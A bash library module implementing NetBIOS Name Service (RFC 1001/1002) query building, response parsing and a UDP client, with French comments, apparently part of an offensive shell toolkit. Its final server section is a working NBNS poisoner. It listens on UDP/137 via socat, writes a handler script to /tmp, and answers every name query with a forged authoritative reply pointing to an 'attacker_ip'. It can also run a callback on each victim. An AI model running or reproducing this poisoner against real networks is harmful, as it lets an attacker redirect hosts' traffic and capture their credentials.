#!/usr/bin/env bash
#
# lib/protocol/netbios/nbns.sh — NetBIOS Name Service (NBNS / NBT-NS)
#
# Sous-ensemble utile pour :
#   - construire des Name Query / Node Status Request
#   - parser des réponses NB / NBSTAT
#   - interroger un hôte via UDP/137
#   - lancer un petit poisoner NBNS en pure bash + socat
#
# Références : RFC 1001/1002, impacket.nmb
#

[[ -n "${_ENSH_PROTO_NBNS:-}" ]] && return 0
readonly _ENSH_PROTO_NBNS=1

ensh::import core/endian
ensh::import core/hex
ensh::import core/log
ensh::import transport/udp
ensh::import protocol/netbios/nbt

readonly NBNS_PORT=137
readonly NBNS_BCAST_V4="255.255.255.255"

readonly NBNS_FLAG_RESPONSE=0x8000
readonly NBNS_FLAG_AUTHORITATIVE=0x0400
readonly NBNS_FLAG_TRUNCATED=0x0200
readonly NBNS_FLAG_RECURSION_DESIRED=0x0100
readonly NBNS_FLAG_BROADCAST=0x0010

readonly NBNS_QUERY_FLAGS_NAME=0x2900
readonly NBNS_QUERY_FLAGS_NODE_STATUS=0x0000

readonly NBNS_QTYPE_NB=32
readonly NBNS_QTYPE_NBSTAT=33
readonly NBNS_CLASS_IN=1
readonly NBNS_DEFAULT_TTL=300

readonly NBNS_ADDR_ENTRY_LEN=6
readonly NBNS_NODE_NAME_ENTRY_LEN=18
readonly NBNS_NODE_STATS_LEN=46

readonly -A _NBNS_QTYPE_NAMES=(
    [32]="NB"
    [33]="NBSTAT"
)

declare -g _NBNS_SERVER_PID=""
declare -g _NBNS_SERVER_HANDLER=""

# ── Helpers octets ───────────────────────────────────────────────────────────

_nbns_hex_to_raw() {
    local hex="${1^^}"
    local -i i
    for (( i = 0; i < ${#hex}; i += 2 )); do
        printf "\\x${hex:${i}:2}"
    done
}

_nbns_raw_to_hex() {
    od -An -tx1 | tr -d ' \n' | tr '[:lower:]' '[:upper:]'
}

_nbns_ipv4_to_hex() {
    local ip="$1"
    local -n _nbns_i4h_out="$2"
    local IFS='.'
    local a b c d
    read -r a b c d <<< "${ip}"
    printf -v _nbns_i4h_out '%02X%02X%02X%02X' "${a}" "${b}" "${c}" "${d}"
}

_nbns_hex_to_ipv4() {
    local hex_ip="${1^^}"
    local -n _nbns_h4i_out="$2"
    _nbns_h4i_out="$(( 16#${hex_ip:0:2} )).$(( 16#${hex_ip:2:2} )).$(( 16#${hex_ip:4:2} )).$(( 16#${hex_ip:6:2} ))"
}

_nbns_format_mac() {
    local mac_hex="${1^^}"
    local -n _nbns_fm_out="$2"
    _nbns_fm_out="${mac_hex:0:2}:${mac_hex:2:2}:${mac_hex:4:2}:${mac_hex:6:2}:${mac_hex:8:2}:${mac_hex:10:2}"
}

_nbns_trim_trailing_spaces() {
    local value="$1"
    local -n _nbns_tts_out="$2"
    _nbns_tts_out="${value}"
    while [[ "${_nbns_tts_out}" == *" " ]]; do
        _nbns_tts_out="${_nbns_tts_out% }"
    done
}

nbns::_random_txid() {
    local -n _nbns_rtx_out="$1"
    _nbns_rtx_out="$(od -An -N2 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n' | tr '[:lower:]' '[:upper:]')"
    if [[ -z "${_nbns_rtx_out}" ]]; then
        printf -v _nbns_rtx_out '%04X' $(( RANDOM % 65536 ))
    fi
    _nbns_rtx_out="${_nbns_rtx_out:0:4}"
    [[ -n "${_nbns_rtx_out}" ]]
}

nbns::_qtype_name() {
    local -i qtype="$1"
    local -n _nbns_qtn_out="$2"
    _nbns_qtn_out="${_NBNS_QTYPE_NAMES[${qtype}]:-${qtype}}"
}

nbns::_encode_raw_name_wire() {
    local raw_hex="${1^^}"
    local -n _nbns_ernw_out="$2"

    _nbns_ernw_out="20"

    local -i i nibble_hi nibble_lo
    for (( i = 0; i < ${#raw_hex}; i += 2 )); do
        nibble_hi=$(( 16#${raw_hex:${i}:1} ))
        nibble_lo=$(( 16#${raw_hex:$(( i + 1 )):1} ))
        printf -v _nbns_ernw_out '%s%02X%02X' \
            "${_nbns_ernw_out}" \
            "$(( 0x41 + nibble_hi ))" \
            "$(( 0x41 + nibble_lo ))"
    done

    _nbns_ernw_out+="00"
}

nbns::_encode_name_wire() {
    local name="$1"
    local suffix_hex="$2"
    local -n _nbns_enw_out="$3"

    if [[ "${name}" == "*" && "${suffix_hex^^}" == "00" ]]; then
        local raw_hex="2A"
        local -i i
        for (( i = 0; i < 15; i++ )); do
            raw_hex+="00"
        done
        nbns::_encode_raw_name_wire "${raw_hex}" _nbns_enw_out
        return $?
    fi

    local raw_name
    nbt::encode_name "${name}" "${suffix_hex}" raw_name || return 1
    _nbns_enw_out="${raw_name%00}"
}

# nbns::_read_name <hex_msg> <offset_bytes> <var_name_out> <var_suffix_out> <var_next_off_out>
#
nbns::_read_name() {
    local hex_msg="${1^^}"
    local -i off="$2"
    local -n _nbns_rn_name="$3"
    local -n _nbns_rn_suffix="$4"
    local -n _nbns_rn_next="$5"

    local len_hex="${hex_msg:$(( off * 2 )):2}"
    if [[ -z "${len_hex}" ]]; then
        log::error "nbns::_read_name : offset hors message"
        return 1
    fi

    local -i enc_len=$(( 16#${len_hex} ))
    local name_hex="${len_hex}${hex_msg:$(( off * 2 + 2 )):$(( enc_len * 2 ))}"
    off=$(( off + 1 + enc_len ))

    local term1="${hex_msg:$(( off * 2 )):2}"
    if [[ "${term1}" != "00" ]]; then
        log::error "nbns::_read_name : terminateur NetBIOS manquant"
        return 1
    fi
    name_hex+="${term1}"
    (( off++ ))

    nbt::decode_name "${name_hex}" _nbns_rn_name _nbns_rn_suffix || return 1
    _nbns_rn_next="${off}"
}

nbns::_parse_nb_answer() {
    local rdata="${1^^}"
    local prefix="$2"
    local -n _nbns_pna_out="$3"

    local -i count=0 i off=0
    while (( off + NBNS_ADDR_ENTRY_LEN * 2 <= ${#rdata} )); do
        local nb_flags ip_hex ip
        nb_flags="${rdata:${off}:4}"
        ip_hex="${rdata:$(( off + 4 )):8}"
        _nbns_hex_to_ipv4 "${ip_hex}" ip

        _nbns_pna_out["${prefix}_ip_${count}"]="${ip}"
        _nbns_pna_out["${prefix}_nb_flags_${count}"]="${nb_flags}"
        (( count++ ))
        off=$(( off + NBNS_ADDR_ENTRY_LEN * 2 ))
    done

    _nbns_pna_out["${prefix}_ip_count"]="${count}"
    if (( count > 0 )); then
        _nbns_pna_out["${prefix}_ip"]="${_nbns_pna_out[${prefix}_ip_0]}"
        _nbns_pna_out["${prefix}_nb_flags"]="${_nbns_pna_out[${prefix}_nb_flags_0]}"
    fi
}

nbns::_parse_nbstat_answer() {
    local rdata="${1^^}"
    local prefix="$2"
    local -n _nbns_pns_out="$3"

    if (( ${#rdata} < 2 )); then
        return 0
    fi

    local -i node_count=$(( 16#${rdata:0:2} ))
    local -i off=2
    _nbns_pns_out["${prefix}_node_count"]="${node_count}"

    local -i i
    for (( i = 0; i < node_count; i++ )); do
        if (( off + NBNS_NODE_NAME_ENTRY_LEN * 2 > ${#rdata} )); then
            break
        fi

        local name_hex="${rdata:${off}:30}"
        local suffix_hex="${rdata:$(( off + 30 )):2}"
        local flags_hex="${rdata:$(( off + 32 )):4}"
        local raw_name name
        hex::to_string "${name_hex}" raw_name
        _nbns_trim_trailing_spaces "${raw_name}" name

        _nbns_pns_out["${prefix}_node_${i}_name"]="${name}"
        _nbns_pns_out["${prefix}_node_${i}_suffix"]="${suffix_hex}"
        _nbns_pns_out["${prefix}_node_${i}_flags"]="${flags_hex}"

        off=$(( off + NBNS_NODE_NAME_ENTRY_LEN * 2 ))
    done

    if (( off + 12 <= ${#rdata} )); then
        local mac_hex="${rdata:${off}:12}"
        local mac
        _nbns_format_mac "${mac_hex}" mac
        _nbns_pns_out["${prefix}_mac"]="${mac}"
    fi
}

# ── Construction de paquets ──────────────────────────────────────────────────

nbns::query::build() {
    local -n _nbns_qb_out="$1"
    local txid_hex="${2^^}"
    local name="$3"
    local suffix_hex="${4:-20}"

    if [[ ${#txid_hex} -ne 4 ]] || ! hex::is_valid "${txid_hex}"; then
        log::error "nbns::query::build : txid invalide"
        return 1
    fi
    if [[ ${#suffix_hex} -ne 2 ]] || ! hex::is_valid "${suffix_hex}"; then
        log::error "nbns::query::build : suffixe invalide"
        return 1
    fi

    local qname flags_hex type_hex class_hex
    nbns::_encode_name_wire "${name}" "${suffix_hex}" qname || return 1
    endian::be16 "${NBNS_QUERY_FLAGS_NAME}" flags_hex
    endian::be16 "${NBNS_QTYPE_NB}" type_hex
    endian::be16 "${NBNS_CLASS_IN}" class_hex

    _nbns_qb_out="${txid_hex}${flags_hex}0001000000000000${qname}${type_hex}${class_hex}"
}

nbns::query::build_node_status() {
    local -n _nbns_qbs_out="$1"
    local txid_hex="${2^^}"
    local name="$3"

    if [[ ${#txid_hex} -ne 4 ]] || ! hex::is_valid "${txid_hex}"; then
        log::error "nbns::query::build_node_status : txid invalide"
        return 1
    fi

    local qname flags_hex type_hex class_hex
    nbns::_encode_name_wire "${name}" "00" qname || return 1
    endian::be16 "${NBNS_QUERY_FLAGS_NODE_STATUS}" flags_hex
    endian::be16 "${NBNS_QTYPE_NBSTAT}" type_hex
    endian::be16 "${NBNS_CLASS_IN}" class_hex

    _nbns_qbs_out="${txid_hex}${flags_hex}0001000000000000${qname}${type_hex}${class_hex}"
}

nbns::response::build() {
    local -n _nbns_rb_out="$1"
    local txid_hex="${2^^}"
    local name="$3"
    local ip_hex="${4^^}"
    local -i ttl="${5:-${NBNS_DEFAULT_TTL}}"
    local suffix_hex="${6:-20}"

    if [[ ${#txid_hex} -ne 4 ]] || ! hex::is_valid "${txid_hex}"; then
        log::error "nbns::response::build : txid invalide"
        return 1
    fi
    if [[ ${#ip_hex} -ne 8 ]] || ! hex::is_valid "${ip_hex}"; then
        log::error "nbns::response::build : ip_hex invalide"
        return 1
    fi

    local qname flags_hex type_hex class_hex ttl_hex rdlength_hex
    nbns::_encode_name_wire "${name}" "${suffix_hex}" qname || return 1
    endian::be16 "$(( NBNS_FLAG_RESPONSE | NBNS_FLAG_AUTHORITATIVE ))" flags_hex
    endian::be16 "${NBNS_QTYPE_NB}" type_hex
    endian::be16 "${NBNS_CLASS_IN}" class_hex
    endian::be32 "${ttl}" ttl_hex
    endian::be16 "${NBNS_ADDR_ENTRY_LEN}" rdlength_hex

    _nbns_rb_out="${txid_hex}${flags_hex}0000000100000000"
    _nbns_rb_out+="${qname}${type_hex}${class_hex}${ttl_hex}${rdlength_hex}0000${ip_hex}"
}

# ── Parsing ──────────────────────────────────────────────────────────────────

nbns::parse() {
    local hex_data="${1^^}"
    local -n _nbns_p_out="$2"

    if (( ${#hex_data} < 24 )) || ! hex::is_valid "${hex_data}"; then
        log::error "nbns::parse : message invalide"
        return 1
    fi

    _nbns_p_out[txid]="${hex_data:0:4}"

    local -i flags qdcount ancount nscount arcount
    endian::read_be16 "${hex_data}" 2 flags
    endian::read_be16 "${hex_data}" 4 qdcount
    endian::read_be16 "${hex_data}" 6 ancount
    endian::read_be16 "${hex_data}" 8 nscount
    endian::read_be16 "${hex_data}" 10 arcount

    _nbns_p_out[flags]="${flags}"
    _nbns_p_out[qr]=$(( (flags >> 15) & 0x1 ))
    _nbns_p_out[opcode]=$(( (flags >> 11) & 0xF ))
    _nbns_p_out[aa]=$(( (flags >> 10) & 0x1 ))
    _nbns_p_out[tc]=$(( (flags >> 9) & 0x1 ))
    _nbns_p_out[rd]=$(( (flags >> 8) & 0x1 ))
    _nbns_p_out[broadcast]=$(( (flags >> 4) & 0x1 ))
    _nbns_p_out[rcode]=$(( flags & 0xF ))
    _nbns_p_out[question_count]="${qdcount}"
    _nbns_p_out[answer_count]="${ancount}"
    _nbns_p_out[authority_count]="${nscount}"
    _nbns_p_out[additional_count]="${arcount}"

    local -i off=12
    if (( qdcount > 0 )); then
        local qname qsuffix next_off
        nbns::_read_name "${hex_data}" "${off}" qname qsuffix next_off || return 1
        off="${next_off}"

        local -i qtype qclass
        endian::read_be16 "${hex_data}" "${off}" qtype
        endian::read_be16 "${hex_data}" "$(( off + 2 ))" qclass
        if (( qtype == 0 )) && [[ "${hex_data:$(( off * 2 )):2}" == "00" ]]; then
            off=$(( off + 1 ))
            endian::read_be16 "${hex_data}" "${off}" qtype
            endian::read_be16 "${hex_data}" "$(( off + 2 ))" qclass
        fi
        off=$(( off + 4 ))

        local qtype_name
        nbns::_qtype_name "${qtype}" qtype_name

        _nbns_p_out[question_name]="${qname}"
        _nbns_p_out[question_suffix]="${qsuffix}"
        _nbns_p_out[qtype]="${qtype}"
        _nbns_p_out[qtype_name]="${qtype_name}"
        _nbns_p_out[qclass]="${qclass}"
    fi

    local -i idx
    for (( idx = 0; idx < ancount; idx++ )); do
        local rr_name rr_suffix next_off
        nbns::_read_name "${hex_data}" "${off}" rr_name rr_suffix next_off || return 1
        off="${next_off}"

        local -i rr_type rr_class rr_ttl rr_rdlength
        endian::read_be16 "${hex_data}" "${off}" rr_type
        endian::read_be16 "${hex_data}" "$(( off + 2 ))" rr_class
        if (( rr_type == 0 )) && [[ "${hex_data:$(( off * 2 )):2}" == "00" ]]; then
            off=$(( off + 1 ))
            endian::read_be16 "${hex_data}" "${off}" rr_type
            endian::read_be16 "${hex_data}" "$(( off + 2 ))" rr_class
        fi
        endian::read_be32 "${hex_data}" "$(( off + 4 ))" rr_ttl
        endian::read_be16 "${hex_data}" "$(( off + 8 ))" rr_rdlength
        off=$(( off + 10 ))

        local rdata="${hex_data:$(( off * 2 )):$(( rr_rdlength * 2 ))}"
        off=$(( off + rr_rdlength ))

        local prefix="answer_${idx}"
        local rr_type_name
        nbns::_qtype_name "${rr_type}" rr_type_name

        _nbns_p_out["${prefix}_name"]="${rr_name}"
        _nbns_p_out["${prefix}_suffix"]="${rr_suffix}"
        _nbns_p_out["${prefix}_type"]="${rr_type}"
        _nbns_p_out["${prefix}_type_name"]="${rr_type_name}"
        _nbns_p_out["${prefix}_class"]="${rr_class}"
        _nbns_p_out["${prefix}_ttl"]="${rr_ttl}"
        _nbns_p_out["${prefix}_rdlength"]="${rr_rdlength}"
        _nbns_p_out["${prefix}_rdata"]="${rdata}"

        case "${rr_type}" in
            ${NBNS_QTYPE_NB})
                nbns::_parse_nb_answer "${rdata}" "${prefix}" _nbns_p_out
                ;;
            ${NBNS_QTYPE_NBSTAT})
                nbns::_parse_nbstat_answer "${rdata}" "${prefix}" _nbns_p_out
                ;;
        esac
    done
}

# ── Client ───────────────────────────────────────────────────────────────────

nbns::_client_send_recv_socat() {
    local host="$1"
    local -i port="$2"
    local hex="${3^^}"
    local -i timeout="$4"
    local iface="${5:-}"
    local -n _nbns_cssr_out="$6"

    local socat_addr="UDP4-DATAGRAM:${host}:${port},reuseaddr"
    [[ "${host}" == "${NBNS_BCAST_V4}" ]] && socat_addr+=",broadcast"
    [[ -n "${iface}" ]] && socat_addr+=",interface=${iface}"

    local result
    result=$(
        {
            _nbns_hex_to_raw "${hex}"
            sleep "${timeout}"
        } | socat -T"${timeout}" - "${socat_addr}" 2>/dev/null | _nbns_raw_to_hex
    )

    _nbns_cssr_out="${result}"
    [[ -n "${result}" ]]
}

nbns::client::query() {
    local -n _nbns_cq_out="$1"
    local name="$2"
    local server_ip="${3:-${ENSH_NBNS_SERVER_IP:-${NBNS_BCAST_V4}}}"

    local iface="${ENSH_NBNS_IFACE:-}"
    local -i port="${ENSH_NBNS_PORT:-${NBNS_PORT}}"
    local -i timeout="${ENSH_NBNS_TIMEOUT:-2}"
    local suffix_hex="${ENSH_NBNS_SUFFIX_HEX:-20}"

    local txid req resp
    nbns::_random_txid txid || {
        log::error "nbns::client : impossible de générer un txid"
        return 1
    }
    nbns::query::build req "${txid}" "${name}" "${suffix_hex}" || return 1

    if command -v socat >/dev/null 2>&1; then
        if ! nbns::_client_send_recv_socat "${server_ip}" "${port}" "${req}" "${timeout}" "${iface}" resp; then
            log::warn "nbns::client : aucune réponse pour '${name}'"
            return 1
        fi
    else
        if [[ "${server_ip}" == "${NBNS_BCAST_V4}" ]]; then
            log::error "nbns::client : socat requis pour les requêtes broadcast"
            return 1
        fi
        if ! udp::send_recv "${server_ip}" "${port}" "${req}" resp "${timeout}" 4096; then
            log::warn "nbns::client : aucune réponse pour '${name}'"
            return 1
        fi
    fi

    nbns::parse "${resp}" _nbns_cq_out || return 1
    _nbns_cq_out[raw_response]="${resp}"
    _nbns_cq_out[request_txid]="${txid}"
    _nbns_cq_out[server_ip]="${server_ip}"
    _nbns_cq_out[server_port]="${port}"

    if [[ "${_nbns_cq_out[txid]}" != "${txid}" ]]; then
        log::warn "nbns::client : txid inattendu (${_nbns_cq_out[txid]} != ${txid})"
    fi
}

# ── Serveur ──────────────────────────────────────────────────────────────────

nbns::server::start() {
    local iface="$1"
    local attacker_ip="$2"
    local callback_cmd="${3:-}"

    if [[ -n "${_NBNS_SERVER_PID:-}" ]] && kill -0 "${_NBNS_SERVER_PID}" 2>/dev/null; then
        log::error "nbns::server : déjà démarré (pid=${_NBNS_SERVER_PID})"
        return 1
    fi

    if ! command -v socat >/dev/null 2>&1; then
        log::error "nbns::server : socat requis pour l'écoute UDP"
        return 1
    fi

    local bind_ip="${ENSH_NBNS_BIND_IP:-0.0.0.0}"
    local -i port="${ENSH_NBNS_PORT:-${NBNS_PORT}}"
    local -i ttl="${ENSH_NBNS_TTL:-${NBNS_DEFAULT_TTL}}"

    local attacker_hex
    _nbns_ipv4_to_hex "${attacker_ip}" attacker_hex

    local _ensh_root
    _ensh_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"

    local handler
    handler="$(mktemp /tmp/.nbns_handler_XXXXXX.sh)"
    chmod 700 "${handler}"
    _NBNS_SERVER_HANDLER="${handler}"

    cat > "${handler}" << HANDLER_EOF
#!/usr/bin/env bash
set -uo pipefail

_hex=\$(od -An -tx1 | tr -d ' \n' | tr '[:lower:]' '[:upper:]')
[[ -n "\${_hex}" ]] || exit 0

source "${_ensh_root}/ensh.sh"
ensh::import protocol/netbios/nbns

declare -A _q
nbns::parse "\${_hex}" _q || exit 0

[[ "\${_q[qr]:-1}" == "0" ]] || exit 0
[[ "\${_q[qtype]:-0}" == "${NBNS_QTYPE_NB}" ]] || exit 0
[[ -n "\${_q[question_name]:-}" ]] || exit 0

declare _resp
nbns::response::build _resp "\${_q[txid]}" "\${_q[question_name]}" "${attacker_hex}" "${ttl}" "\${_q[question_suffix]:-20}" || exit 0

for (( _i = 0; _i < \${#_resp}; _i += 2 )); do
    printf "\\\\x\${_resp:\${_i}:2}"
done

if [[ -n "${callback_cmd}" && -n "\${SOCAT_PEERADDR:-}" ]]; then
    ${callback_cmd} "\${_q[question_name]}" "\${SOCAT_PEERADDR}" &>/dev/null &
fi
HANDLER_EOF

    local socat_in="UDP4-RECVFROM:${port},bind=${bind_ip},reuseaddr,fork"
    [[ -n "${iface}" ]] && socat_in+=",interface=${iface}"

    socat "${socat_in}" "EXEC:bash ${handler}" >/dev/null 2>&1 &
    local -i pid=$!

    sleep 0.3
    if ! kill -0 "${pid}" 2>/dev/null; then
        wait "${pid}" 2>/dev/null || true
        rm -f "${handler}"
        _NBNS_SERVER_HANDLER=""
        log::error "nbns::server : échec du démarrage (vérifier les droits sur :${port})"
        return 1
    fi

    _NBNS_SERVER_PID="${pid}"
    log::info "nbns : serveur démarré — ${bind_ip}:${port} iface=${iface:-any} attacker=${attacker_ip} (pid=${pid})"
}

nbns::server::stop() {
    if [[ -z "${_NBNS_SERVER_PID:-}" ]]; then
        return 0
    fi

    kill "${_NBNS_SERVER_PID}" 2>/dev/null || true
    wait "${_NBNS_SERVER_PID}" 2>/dev/null || true
    log::debug "nbns : serveur arrêté (pid=${_NBNS_SERVER_PID})"

    [[ -n "${_NBNS_SERVER_HANDLER:-}" ]] && rm -f "${_NBNS_SERVER_HANDLER}"
    _NBNS_SERVER_PID=""
    _NBNS_SERVER_HANDLER=""
}
